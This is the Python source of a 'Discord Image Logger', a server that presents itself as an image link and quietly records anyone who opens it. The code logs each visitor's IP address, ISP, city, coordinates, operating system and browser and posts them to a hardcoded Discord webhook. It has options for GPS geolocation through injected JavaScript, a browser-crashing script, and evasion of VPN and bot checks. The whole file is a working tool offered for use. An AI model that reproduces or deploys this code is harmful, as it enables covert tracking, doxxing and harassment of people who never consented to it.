# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1137301477870813214/9PPcBX5K7Qp-OlxlcvUjKp2CljHaP0XLEtN4NBIv-5aAR-X3YOhIaV5raBmcXk5bsYzE",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

